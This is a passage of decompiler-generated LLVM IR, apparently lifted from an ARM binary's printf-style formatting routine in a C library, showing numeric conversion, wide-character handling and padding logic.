  br label %dec_label_pc_10450

dec_label_pc_10438:                               ; preds = %bb139
  br i1 %v7_10518, label %bb140, label %dec_label_pc_10444

bb140:                                            ; preds = %dec_label_pc_10438
  store i32 55, i32* @r5, align 4
  br label %dec_label_pc_10450

dec_label_pc_10444:                               ; preds = %dec_label_pc_10438
  br i1 %v7_10464, label %dec_label_pc_10454, label %dec_label_pc_10450

dec_label_pc_10450:                               ; preds = %.thread84, %bb140, %dec_label_pc_10444
  %v0_1047c86 = phi i32 [ %v5_10430, %.thread84 ], [ %v4_10404, %bb140 ], [ %v4_10404, %dec_label_pc_10444 ]
  br label %dec_label_pc_10454

dec_label_pc_10454:                               ; preds = %dec_label_pc_10444, %dec_label_pc_10450
  %v0_1047c85 = phi i32 [ %v0_1047c86, %dec_label_pc_10450 ], [ %v4_10404, %dec_label_pc_10444 ]
  %storemerge92 = phi i32 [ 11, %dec_label_pc_10450 ], [ 6, %dec_label_pc_10444 ]
  store i32 %storemerge92, i32* @r7, align 4
  %v3_10454 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_10454, i32* %r3.global-to-local, align 4
  %v1_10458 = icmp slt i32 %v3_10454, 0
  %v7_1045c. = select i1 %v1_10458, i32 %v7_1045c, i32 32
  store i32 %v7_1045c., i32* @sb, align 4
  br i1 %v7_10464, label %bb145, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_10454
  store i32 %v2_103b0, i32* @lr, align 4
  %v2_1046c = load i32, i32* @ip, align 4
  %v5_1046c = mul i32 %v2_1046c, 4
  %v6_1046c = add i32 %v5_1046c, %v2_103b0
  store i32 %v6_1046c, i32* %r3.global-to-local, align 4
  %v2_10470 = add i32 %v6_1046c, -260
  %v3_10470 = inttoptr i32 %v2_10470 to i32*
  %v4_10470 = load i32, i32* %v3_10470, align 4
  store i32 %v4_10470, i32* %r3.global-to-local, align 4
  %v2_10478 = and i32 %v4_10470, 3840
  br label %bb145

bb145:                                            ; preds = %dec_label_pc_10454, %.thread16
  %storemerge94 = phi i32 [ %v2_10478, %.thread16 ], [ 1024, %dec_label_pc_10454 ]
  store i32 %storemerge94, i32* @r0, align 4
  store i32 %v0_1047c85, i32* @r2, align 4
  store i32 %tmp101, i32* @r1, align 4
  %v0_10484 = call i32 @_load_inttype()
  %v0_10488 = load i32, i32* @r1, align 4
  store i32 %v0_10488, i32* %r2.global-to-local, align 4
  %v0_10494 = load i32, i32* @r4, align 4
  store i32 %v0_10494, i32* %r3.global-to-local, align 4
  store i32 %v2_10498, i32* %r0.global-to-local, align 4
  %v0_1049c = load i32, i32* @r5, align 4
  %v6_104a0 = call i32 @_uintmaxtostr(i8* %v5_104a0, i32 %v0_10484, i32 %v0_10488, i32 %v0_10494, i32 %v0_1049c)
  store i32 %v6_104a0, i32* %r0.global-to-local, align 4
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  store i32 %v6_104a0, i32* @r6, align 4
  br i1 %v3_104b0, label %bb148, label %dec_label_pc_104b4

dec_label_pc_104b4:                               ; preds = %bb145
  %v7_104a0 = inttoptr i32 %v6_104a0 to i8*
  %v3_104b4 = load i8, i8* %v7_104a0, align 1
  %v7_104b8 = icmp eq i8 %v3_104b4, 45
  %v2_104c0 = or i32 %v0_10424, 2
  %v2_104c0.stack_var_-316.4 = select i1 %v7_104b8, i32 %v2_104c0, i32 %v0_10424
  store i32 %v2_104c0.stack_var_-316.4, i32* %r3.global-to-local, align 4
  br i1 %v7_104b8, label %.thread18, label %dec_label_pc_104d4

.thread18:                                        ; preds = %dec_label_pc_104b4
  %v3_104c4 = add i32 %v6_104a0, 1
  store i32 %v3_104c4, i32* @r6, align 4
  store i32 2, i32* @r7, align 4
  br label %bb148

dec_label_pc_104d4:                               ; preds = %dec_label_pc_104b4
  %v1_104d4 = and i32 %v2_104c0.stack_var_-316.4, 2
  %v2_104d4 = icmp eq i32 %v1_104d4, 0
  br i1 %v2_104d4, label %dec_label_pc_104e0, label %bb146

bb146:                                            ; preds = %dec_label_pc_104d4
  store i32 0, i32* @r7, align 4
  br label %bb148

dec_label_pc_104e0:                               ; preds = %dec_label_pc_104d4
  %v1_104e0 = urem i32 %v2_104c0.stack_var_-316.4, 2
  %v2_104e0 = icmp eq i32 %v1_104e0, 0
  br i1 %v2_104e0, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_104e0
  store i32 4, i32* @r7, align 4
  br label %bb148

bb148:                                            ; preds = %.thread18, %bb146, %bb145, %dec_label_pc_104e0, %bb147
  %v0_1053c = phi i32 [ %v6_104a0, %bb145 ], [ %v3_104c4, %.thread18 ], [ %v6_104a0, %dec_label_pc_104e0 ], [ %v6_104a0, %bb147 ], [ %v6_104a0, %bb146 ]
  %v0_104f8 = phi i32 [ %v0_10424, %bb145 ], [ %v2_104c0, %.thread18 ], [ %v0_10424, %dec_label_pc_104e0 ], [ %v0_10424, %bb147 ], [ %v0_10424, %bb146 ]
  %v3_104e8 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_104e8, i32* %r2.global-to-local, align 4
  store i32 %v0_104f8, i32* %r3.global-to-local, align 4
  %v1_104f0 = icmp slt i32 %v3_104e8, 0
  br i1 %v1_104f0, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v0_10520 = phi i32 [ %v3_104e8, %bb148 ], [ 1, %bb149 ]
  %v1_104f8 = and i32 %v0_104f8, 16
  %v2_104f8 = icmp eq i32 %v1_104f8, 0
  store i32 %v2_106cc, i32* %r3.global-to-local, align 4
  %v2_10500 = sub i32 %v2_106cc, %v0_1053c
  %v1_10504 = add i32 %v2_10500, 127
  store i32 %v1_10504, i32* @r5, align 4
  br i1 %v2_104f8, label %bb157, label %dec_label_pc_1050c

dec_label_pc_1050c:                               ; preds = %bb150
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  br i1 %tmp197, label %bb151, label %bb152

bb151:                                            ; preds = %dec_label_pc_1050c
  store i32 6, i32* @r7, align 4
  br label %bb152

bb152:                                            ; preds = %dec_label_pc_1050c, %bb151
  br i1 %v7_10518, label %bb153, label %bb154

bb153:                                            ; preds = %bb152
  store i32 9, i32* @r7, align 4
  br label %bb154

bb154:                                            ; preds = %bb152, %bb153
  %tmp198 = icmp ugt i32 %v0_10520, %v1_10504
  br i1 %tmp198, label %bb157, label %bb155

bb155:                                            ; preds = %bb154
  br i1 %v11_10524, label %dec_label_pc_1052c, label %bb157

dec_label_pc_1052c:                               ; preds = %bb155
  %v1_1052c = inttoptr i32 %v0_1053c to i8*
  %v2_1052c = load i8, i8* %v1_1052c, align 1
  %v3_1052c = zext i8 %v2_1052c to i32
  store i32 %v3_1052c, i32* %r3.global-to-local, align 4
  %v7_10530 = icmp eq i8 %v2_1052c, 48
  br i1 %v7_10530, label %bb156, label %.thread25

bb156:                                            ; preds = %dec_label_pc_1052c
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb157

.thread25:                                        ; preds = %dec_label_pc_1052c
  %v2_10538 = add i32 %v2_10500, 128
  store i32 %v2_10538, i32* %r2.global-to-local, align 4
  br label %bb157

bb157:                                            ; preds = %bb154, %bb156, %bb155, %bb150, %.thread25
  %v5_10574 = phi i32 [ %v0_10520, %bb155 ], [ %v0_10520, %bb150 ], [ 1, %bb156 ], [ %v2_10538, %.thread25 ], [ %v0_10520, %bb154 ]
  %v1_1053c = inttoptr i32 %v0_1053c to i8*
  %v2_1053c = load i8, i8* %v1_1053c, align 1
  %v3_1053c = zext i8 %v2_1053c to i32
  store i32 %v3_1053c, i32* %r3.global-to-local, align 4
  %v7_10540 = icmp eq i8 %v2_1053c, 48
  br i1 %v7_10540, label %dec_label_pc_10548, label %dec_label_pc_10570

dec_label_pc_10548:                               ; preds = %bb157
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  %v0_1054c = load i32, i32* @r7, align 4
  %v7_10550 = icmp slt i32 %v0_1054c, 6
  br i1 %v7_10550, label %bb159, label %bb158

bb158:                                            ; preds = %dec_label_pc_10548
  store i32 11, i32* @r7, align 4
  br label %bb159

bb159:                                            ; preds = %dec_label_pc_10548, %bb158
  br i1 %v7_10464, label %.thread26, label %dec_label_pc_10564

.thread26:                                        ; preds = %bb159
  store i32 ptrtoint ([6 x i8]* @global_var_192f4.348 to i32), i32* @r6, align 4
  store i32 5, i32* @r5, align 4
  br label %dec_label_pc_106e4

dec_label_pc_10564:                               ; preds = %bb159
  %v2_10564 = icmp eq i32 %v5_10574, 0
  br i1 %v2_10564, label %bb160, label %dec_label_pc_10570

bb160:                                            ; preds = %dec_label_pc_10564
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_106e4

dec_label_pc_10570:                               ; preds = %dec_label_pc_10564, %bb157
  %v2_10570 = sub i32 %v5_10574, %v1_10504
  %tmp199 = icmp ugt i32 %v5_10574, %v1_10504
  br i1 %tmp199, label %.thread90, label %dec_label_pc_106e4

.thread90:                                        ; preds = %dec_label_pc_10570
  store i32 %v2_10570, i32* @r4, align 4
  br label %dec_label_pc_10700thread-pre-split

dec_label_pc_10580:                               ; preds = %dec_label_pc_103f4
  br i1 %tmp196, label %dec_label_pc_105bc, label %dec_label_pc_10588

dec_label_pc_10588:                               ; preds = %dec_label_pc_10580
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  %v0_10594 = load i32, i32* @fp, align 4
  store i32 %v0_10594, i32* %r0.global-to-local, align 4
  %v2_10598 = load i32, i32* %v1_103dc, align 4
  %v5_10598 = load i32, i32* %v4_10598, align 4
  store i32 %v5_10598, i32* %r2.global-to-local, align 4
  store i32 %v2_1059c, i32* %r3.global-to-local, align 4
  %v6_105a0 = call i32 @_fpmaxtostr(i32 %v0_10594, i32 %v2_10598, i32 %v5_10598, i32* nonnull %stack_var_-328, i32 66048)
  store i32 %v6_105a0, i32* %r0.global-to-local, align 4
  %v1_105a4 = icmp slt i32 %v6_105a0, 0
  br i1 %v1_105a4, label %dec_label_pc_10850, label %dec_label_pc_105ac

dec_label_pc_105ac:                               ; preds = %dec_label_pc_10588
  %v2_105b0 = add i32 %v6_105a0, %stack_var_-336.2
  store i32 %v2_105b0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1083c

dec_label_pc_105bc:                               ; preds = %dec_label_pc_10580
  br i1 %v3_105c0, label %dec_label_pc_1065c, label %dec_label_pc_105c4

dec_label_pc_105c4:                               ; preds = %dec_label_pc_105bc
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  br i1 %v7_105bc, label %dec_label_pc_105d4, label %dec_label_pc_10624

dec_label_pc_105d4:                               ; preds = %dec_label_pc_105c4
  %v2_105d4 = load i32, i32* %v1_103dc, align 4
  store i32 %v2_105d4, i32* %r3.global-to-local, align 4
  %v9_105d8 = icmp eq i32 %v2_105d4, 0
  store i32 %v2_105d4, i32* %stack_var_-44, align 4
  br i1 %v9_105d8, label %dec_label_pc_106ec, label %dec_label_pc_105e4

dec_label_pc_105e4:                               ; preds = %dec_label_pc_105d4
  %v3_105e4 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_105e4, i32* %r3.global-to-local, align 4
  store i32 %v2_105e8, i32* @r0, align 4
  %v5_105f4 = icmp slt i32 %v3_105e4, -1
  br i1 %v5_105f4, label %bb162, label %bb161

bb161:                                            ; preds = %dec_label_pc_105e4
  br label %bb162

bb162:                                            ; preds = %dec_label_pc_105e4, %bb161
  %storemerge193 = phi i32 [ %v3_105e4, %bb161 ], [ -1, %dec_label_pc_105e4 ]
  store i32 %storemerge193, i32* @r2, align 4
  store i32 %v2_105e8, i32* @r1, align 4
  store i32 %v2_105fc, i32* %r3.global-to-local, align 4
  %v0_10600 = call i32 @__GI_wcsrtombs()
  store i32 %v0_10600, i32* %r0.global-to-local, align 4
  %v7_10604 = icmp eq i32 %v0_10600, -1
  store i32 %v0_10600, i32* @r5, align 4
  br i1 %v7_10604, label %dec_label_pc_10850, label %dec_label_pc_10610

dec_label_pc_10610:                               ; preds = %bb162
  %v0_10610 = load i32, i32* @sl, align 4
  store i32 %v0_10610, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_10610, i32* @r6, align 4
  br label %dec_label_pc_10700

dec_label_pc_10624:                               ; preds = %dec_label_pc_105c4
  store i32 %v2_106cc, i32* %r8.global-to-local, align 4
  %v2_10628 = load i32, i32* %v1_103dc, align 4
  store i32 %v2_105fc, i32* %r2.global-to-local, align 4
  store i32 %v2_106cc, i32* %r0.global-to-local, align 4
  %v3_10634 = call i32 @__GI_wcrtomb(i32 %v2_106cc, i32 %v2_10628, i32 %v2_105fc)
  store i32 %v3_10634, i32* %r0.global-to-local, align 4
  %v7_10638 = icmp eq i32 %v3_10634, -1
  store i32 %v3_10634, i32* @r5, align 4
  br i1 %v7_10638, label %dec_label_pc_10850, label %dec_label_pc_10644

dec_label_pc_10644:                               ; preds = %dec_label_pc_10624
  %v0_10644 = load i32, i32* @sl, align 4
  store i32 %v0_10644, i32* @r4, align 4
  store i32 %v2_106cc, i32* @r6, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  %v1_10654 = trunc i32 %v0_10644 to i8
  %v2_10654 = load i32, i32* %r8.global-to-local, align 4
  %v4_10654 = add i32 %v2_10654, %v3_10634
  %v5_10654 = inttoptr i32 %v4_10654 to i8*
  store i8 %v1_10654, i8* %v5_10654, align 1
  %v0_10704.pre.pre = load i32, i32* @r5, align 4
  %v1_10704.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10700thread-pre-split

dec_label_pc_1065c:                               ; preds = %dec_label_pc_105bc
  br i1 %v3_10660, label %dec_label_pc_106c0, label %dec_label_pc_10664

dec_label_pc_10664:                               ; preds = %dec_label_pc_1065c
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  %v2_1066c = load i32, i32* %v1_103dc, align 4
  br i1 %v7_1065c, label %dec_label_pc_1066c, label %dec_label_pc_10698

dec_label_pc_1066c:                               ; preds = %dec_label_pc_10664
  store i32 %v2_1066c, i32* @r6, align 4
  %v2_10670 = icmp eq i32 %v2_1066c, 0
  br i1 %v2_10670, label %dec_label_pc_106ec, label %dec_label_pc_10678

dec_label_pc_10678:                               ; preds = %dec_label_pc_1066c, %dec_label_pc_106c8
  %v0_10688 = phi i32 [ %v2_1066c, %dec_label_pc_1066c ], [ %v3_106d8, %dec_label_pc_106c8 ]
  %v3_10678 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_10678, i32* %r3.global-to-local, align 4
  %v5_10684 = icmp slt i32 %v3_10678, -1
  br i1 %v5_10684, label %bb164, label %bb163

bb163:                                            ; preds = %dec_label_pc_10678
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_10678, %bb163
  %storemerge194 = phi i32 [ %v3_10678, %bb163 ], [ -1, %dec_label_pc_10678 ]
  store i32 %storemerge194, i32* @r1, align 4
  store i32 %v0_10688, i32* %r0.global-to-local, align 4
  %v1_1068c = inttoptr i32 %v0_10688 to i8*
  %v2_1068c = call i32 @strnlen(i8* %v1_1068c)
  store i32 %v2_1068c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_106f4

dec_label_pc_10698:                               ; preds = %dec_label_pc_10664
  store i32 %v2_1066c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_106cc, i32* @r6, align 4
  store i32 %v2_1066c, i32* %stack_var_-180, align 4
  br label %dec_label_pc_10700thread-pre-split

dec_label_pc_106c0:                               ; preds = %dec_label_pc_1065c
  br i1 %v7_106c0, label %dec_label_pc_106c8, label %dec_label_pc_10850

dec_label_pc_106c8:                               ; preds = %dec_label_pc_106c0
  %v0_106c8 = call i32 @__errno_location()
  store i32 %v0_106c8, i32* %r0.global-to-local, align 4
  %v1_106d0 = inttoptr i32 %v0_106c8 to i32*
  %v2_106d0 = load i32, i32* %v1_106d0, align 4
  store i32 %v2_106d0, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  %v3_106d8 = call i32 @__GI___glibc_strerror_r(i32 %v2_106d0, i32 %v2_106cc, i32 128)
  store i32 %v3_106d8, i32* %r0.global-to-local, align 4
  store i32 %v3_106d8, i32* @r6, align 4
  br label %dec_label_pc_10678

dec_label_pc_106e4:                               ; preds = %dec_label_pc_10570, %.thread26, %bb160
  %v0_10704.pre81 = phi i32 [ 0, %bb160 ], [ 5, %.thread26 ], [ %v1_10504, %dec_label_pc_10570 ]
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_10700thread-pre-split

dec_label_pc_106ec:                               ; preds = %dec_label_pc_1066c, %dec_label_pc_105d4
  store i32 ptrtoint ([7 x i8]* @global_var_192fc.351 to i32), i32* @r6, align 4
  br label %dec_label_pc_106f4

dec_label_pc_106f4:                               ; preds = %bb164, %dec_label_pc_106ec
  %storemerge = phi i32 [ 6, %dec_label_pc_106ec ], [ %v2_1068c, %bb164 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_10700

dec_label_pc_10700thread-pre-split:               ; preds = %.thread90, %dec_label_pc_10644, %dec_label_pc_10698, %dec_label_pc_106e4
  %v1_10704.pre = phi i32 [ 0, %dec_label_pc_106e4 ], [ %v1_10704.pre.pre, %dec_label_pc_10644 ], [ 0, %dec_label_pc_10698 ], [ %v2_10570, %.thread90 ]
  %v0_10704.pre = phi i32 [ %v0_10704.pre81, %dec_label_pc_106e4 ], [ %v0_10704.pre.pre, %dec_label_pc_10644 ], [ 1, %dec_label_pc_10698 ], [ %v1_10504, %.thread90 ]
  %stack_var_-316.2.ph = phi i32 [ %v0_104f8, %dec_label_pc_106e4 ], [ %v0_10424, %dec_label_pc_10644 ], [ %v0_10424, %dec_label_pc_10698 ], [ %v0_104f8, %.thread90 ]
  %v0_10700.pr = load i32, i32* @r7, align 4
  br label %dec_label_pc_10700

dec_label_pc_10700:                               ; preds = %dec_label_pc_10700thread-pre-split, %dec_label_pc_10610, %dec_label_pc_106f4
  %v1_10740 = phi i32 [ %v1_10704.pre, %dec_label_pc_10700thread-pre-split ], [ %v0_10610, %dec_label_pc_10610 ], [ 0, %dec_label_pc_106f4 ]
  %v0_10704 = phi i32 [ %v0_10704.pre, %dec_label_pc_10700thread-pre-split ], [ %v0_10600, %dec_label_pc_10610 ], [ %storemerge, %dec_label_pc_106f4 ]
  %v0_1070c = phi i32 [ %v0_10700.pr, %dec_label_pc_10700thread-pre-split ], [ 11, %dec_label_pc_10610 ], [ 11, %dec_label_pc_106f4 ]
  %v0_10748 = phi i32 [ %stack_var_-316.2.ph, %dec_label_pc_10700thread-pre-split ], [ %v0_10424, %dec_label_pc_10610 ], [ %v0_10424, %dec_label_pc_106f4 ]
  %v7_10700 = icmp eq i32 %v0_1070c, 11
  %v2_10704 = add i32 %v0_10704, %v1_10740
  br i1 %v7_10700, label %dec_label_pc_1071c, label %bb165

bb165:                                            ; preds = %dec_label_pc_10700
  %v7_10714 = icmp sgt i32 %v0_1070c, 5
  %. = select i1 %v7_10714, i32 2, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_10718 = add i32 %., %v2_10704
  br label %dec_label_pc_1071c

dec_label_pc_1071c:                               ; preds = %dec_label_pc_10700, %bb165
  %v0_10730 = phi i32 [ %v2_10704, %dec_label_pc_10700 ], [ %v2_10718, %bb165 ]
  store i32 %tmp97, i32* %r2.global-to-local, align 4
  %v2_10720 = sub i32 %tmp97, %v0_10730
  %v3_10720 = icmp uge i32 %tmp97, %v0_10730
  %v9_10720 = icmp eq i32 %tmp97, %v0_10730
  %v2_10724 = xor i1 %v3_10720, true
  %v3_10724 = or i1 %v9_10720, %v2_10724
  br i1 %v3_10724, label %bb166, label %bb167

bb166:                                            ; preds = %dec_label_pc_1071c
  store i32 0, i32* @sl, align 4
  br label %bb167

bb167:                                            ; preds = %dec_label_pc_1071c, %bb166
  %v2_10728 = xor i1 %v9_10720, true
  %v3_10728 = and i1 %v3_10720, %v2_10728
  br i1 %v3_10728, label %bb168, label %._crit_edge

._crit_edge:                                      ; preds = %bb167
  %v1_10730.pre = load i32, i32* @sl, align 4
  br label %bb169

bb168:                                            ; preds = %bb167
  store i32 %v2_10720, i32* @sl, align 4
  br label %bb169

bb169:                                            ; preds = %._crit_edge, %bb168
  %v2_10740 = phi i32 [ %v1_10730.pre, %._crit_edge ], [ %v2_10720, %bb168 ]
  %v2_10730 = add i32 %v0_10730, %stack_var_-336.2
  %v2_10734 = add i32 %v2_10730, %v2_10740
  store i32 %v2_10734, i32* @ip, align 4
  store i32 %v0_10748, i32* %r3.global-to-local, align 4
  %v0_1073c = load i32, i32* @sb, align 4
  %v7_1073c = icmp eq i32 %v0_1073c, 48
  br i1 %v7_1073c, label %bb170, label %.thread29

bb170:                                            ; preds = %bb169
  %v3_10740 = add i32 %v2_10740, %v1_10740
  store i32 %v3_10740, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread29

.thread29:                                        ; preds = %bb169, %bb170
  %v0_1075c = phi i32 [ %v2_10740, %bb169 ], [ 0, %bb170 ]
  %v1_10748 = and i32 %v0_10748, 8
  store i32 %v1_10748, i32* @r8, align 4
  %v2_10748 = icmp eq i32 %v1_10748, 0
  br i1 %v2_10748, label %dec_label_pc_10754, label %dec_label_pc_10770

dec_label_pc_10754:                               ; preds = %.thread29
  %v0_10754 = load i32, i32* @fp, align 4
  store i32 %v0_10754, i32* %r0.global-to-local, align 4
  store i32 %v0_1075c, i32* %r2.global-to-local, align 4
  %v4_10760 = call i32 @_charpad(i32 %v0_10754, i8 32, i32 %v0_1075c)
  store i32 %v4_10760, i32* %r0.global-to-local, align 4
  %v1_10764 = load i32, i32* @sl, align 4
  %v9_10764 = icmp eq i32 %v4_10760, %v1_10764
  br i1 %v9_10764, label %dec_label_pc_1076c, label %dec_label_pc_10850

dec_label_pc_1076c:                               ; preds = %dec_label_pc_10754
  %v0_1076c = load i32, i32* @r8, align 4
  store i32 %v0_1076c, i32* @sl, align 4
  %v0_10778.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10770

dec_label_pc_10770:                               ; preds = %.thread29, %dec_label_pc_1076c
  %v0_10778 = phi i32 [ %v0_1070c, %.thread29 ], [ %v0_10778.pre, %dec_label_pc_1076c ]
  %v0_10774 = load i32, i32* @fp, align 4
  %v2_10778 = add i32 %v0_10778, ptrtoint (i32* @global_var_19304.353 to i32)
  store i32 %v2_10778, i32* %r0.global-to-local, align 4
  %v2_1077c = inttoptr i32 %v2_10778 to i8*
  %v3_1077c = call i32 @__GI_fputs_unlocked(i8* %v2_1077c, i32 %v0_10774)
  %v0_10780 = load i32, i32* @fp, align 4
  store i32 %v0_10780, i32* %r0.global-to-local, align 4
  %v0_10788 = load i32, i32* @r4, align 4
  store i32 %v0_10788, i32* %r2.global-to-local, align 4
  %v4_1078c = call i32 @_charpad(i32 %v0_10780, i8 48, i32 %v0_10788)
  store i32 %v4_1078c, i32* %r0.global-to-local, align 4
  %v1_10790 = load i32, i32* @r4, align 4
  %v9_10790 = icmp eq i32 %v4_1078c, %v1_10790
  br i1 %v9_10790, label %dec_label_pc_10798, label %dec_label_pc_10850

dec_label_pc_10798:                               ; preds = %dec_label_pc_10770
  %v3_10798 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_10798, i32* %r3.global-to-local, align 4
  %v2_1079c = icmp eq i32 %v3_10798, 0
  br i1 %v2_1079c, label %dec_label_pc_107ac, label %dec_label_pc_1080cthread-pre-split

dec_label_pc_107ac:                               ; preds = %dec_label_pc_10798
  %v0_107ac = load i32, i32* @r5, align 4
  %v2_107ac = icmp eq i32 %v0_107ac, 0
  br i1 %v2_107ac, label %bb171, label %bb172

bb171:                                            ; preds = %dec_label_pc_107ac
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread36

bb172:                                            ; preds = %dec_label_pc_107ac
  %v1_107b4 = load i32, i32* @r6, align 4
  store i32 %v1_107b4, i32* %r0.global-to-local, align 4
  %v1_107bc = load i32, i32* @fp, align 4
  store i32 %v1_107bc, i32* %r2.global-to-local, align 4
  br label %.thread36

.thread36:                                        ; preds = %bb171, %bb172
  store i32 67524, i32* @lr, align 4
  %v1_107c0 = xor i1 %v2_107ac, true
  call void @__pseudo_cond_branch(i1 %v1_107c0, i32 ptrtoint (i32* @global_var_13e54.344 to i32))
  %v0_107c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_107c4 = load i32, i32* @r5, align 4
  %v9_107c4 = icmp eq i32 %v0_107c4, %v1_107c4
  br i1 %v9_107c4, label %dec_label_pc_10824, label %dec_label_pc_10850

dec_label_pc_107d0:                               ; preds = %dec_label_pc_1080c
  %v2_107d0 = icmp ult i32 %v1_107d4, 128
  %.v1_107d4 = select i1 %v2_107d0, i32 %v1_107d4, i32 128
  store i32 %.v1_107d4, i32* @r2, align 4
  %v0_107dc = call i32 @__GI_wcsrtombs()
  store i32 %v0_107dc, i32* @r4, align 4
  %v2_107e0 = icmp eq i32 %v0_107dc, 0
  store i32 %v0_107dc, i32* %r3.global-to-local, align 4
  store i32 %v2_106cc, i32* %r0.global-to-local, align 4
  %v0_107f0 = load i32, i32* @fp, align 4
  store i32 %v0_107f0, i32* %r2.global-to-local, align 4
  br i1 %v2_107e0, label %dec_label_pc_10800, label %dec_label_pc_107f8

dec_label_pc_107f8:                               ; preds = %dec_label_pc_107d0
  %v3_107f8 = call i32 @__stdio_fwrite(i32 %v2_106cc, i32 %v0_107dc, i32 %v0_107f0)
  store i32 %v3_107f8, i32* %r0.global-to-local, align 4
  store i32 %v3_107f8, i32* %r3.global-to-local, align 4
  %v1_10800.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10800

dec_label_pc_10800:                               ; preds = %dec_label_pc_107d0, %dec_label_pc_107f8
  %v1_10800 = phi i32 [ 0, %dec_label_pc_107d0 ], [ %v1_10800.pre, %dec_label_pc_107f8 ]
  %v0_10804 = phi i32 [ 0, %dec_label_pc_107d0 ], [ %v3_107f8, %dec_label_pc_107f8 ]
  %v9_10800 = icmp eq i32 %v0_10804, %v1_10800
  %v1_10804 = load i32, i32* @r5, align 4
  %v2_10804 = sub i32 %v1_10804, %v0_10804
  store i32 %v2_10804, i32* @r5, align 4
  br i1 %v9_10800, label %dec_label_pc_1080c, label %dec_label_pc_10850

dec_label_pc_1080cthread-pre-split:               ; preds = %dec_label_pc_10798
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_10810.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_1080c

dec_label_pc_1080c:                               ; preds = %dec_label_pc_1080cthread-pre-split, %dec_label_pc_10800
  %v1_107d4 = phi i32 [ %v0_10810.pr, %dec_label_pc_1080cthread-pre-split ], [ %v2_10804, %dec_label_pc_10800 ]
  store i32 %v2_106cc, i32* @r6, align 4
  %v2_10810 = icmp eq i32 %v1_107d4, 0
  store i32 %v2_105e8, i32* @r1, align 4
  store i32 %v2_105fc, i32* %r3.global-to-local, align 4
  store i32 %v2_106cc, i32* @r0, align 4
  br i1 %v2_10810, label %dec_label_pc_10824, label %dec_label_pc_107d0

dec_label_pc_10824:                               ; preds = %dec_label_pc_1080c, %.thread36
  %v0_10824 = load i32, i32* @fp, align 4
  store i32 %v0_10824, i32* %r0.global-to-local, align 4
  %v0_1082c = load i32, i32* @sl, align 4
  store i32 %v0_1082c, i32* %r2.global-to-local, align 4
  %v4_10830 = call i32 @_charpad(i32 %v0_10824, i8 32, i32 %v0_1082c)
  store i32 %v4_10830, i32* %r0.global-to-local, align 4
  %v1_10834 = load i32, i32* @sl, align 4
  %v9_10834 = icmp eq i32 %v4_10830, %v1_10834
  br i1 %v9_10834, label %dec_label_pc_1083c, label %dec_label_pc_10850

dec_label_pc_1083c:                               ; preds = %dec_label_pc_10824, %dec_label_pc_105ac, %dec_label_pc_103d0
  %stack_var_-316.3 = phi i32 [ %v0_10424, %dec_label_pc_103d0 ], [ %v0_10748, %dec_label_pc_10824 ], [ %v0_10424, %dec_label_pc_105ac ]
  %stack_var_-336.3 = phi i32 [ %stack_var_-336.2, %dec_label_pc_103d0 ], [ %v2_10734, %dec_label_pc_10824 ], [ %v2_105b0, %dec_label_pc_105ac ]
  %v3_1083c = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_1083c, i32* @r4, align 4
  br label %dec_label_pc_10840

dec_label_pc_10840:                               ; preds = %dec_label_pc_102e0, %dec_label_pc_1083c
  %v0_10840 = phi i32 [ %v0_10840.pre, %dec_label_pc_102e0 ], [ %v3_1083c, %dec_label_pc_1083c ]
  %v0_10424 = phi i32 [ %tmp100, %dec_label_pc_102e0 ], [ %stack_var_-316.3, %dec_label_pc_1083c ]
  %stack_var_-336.4 = phi i32 [ 0, %dec_label_pc_102e0 ], [ %stack_var_-336.3, %dec_label_pc_1083c ]
  store i32 %v0_10840, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_102f8.outer

dec_label_pc_102f8.outer:                         ; preds = %dec_label_pc_10848, %dec_label_pc_10840
  %v5_10324 = phi i32 [ %v1_10354, %dec_label_pc_10848 ], [ %v0_10840, %dec_label_pc_10840 ]
  %v0_102f849 = phi i32 [ %v1_10848, %dec_label_pc_10848 ], [ %v0_10840, %dec_label_pc_10840 ]
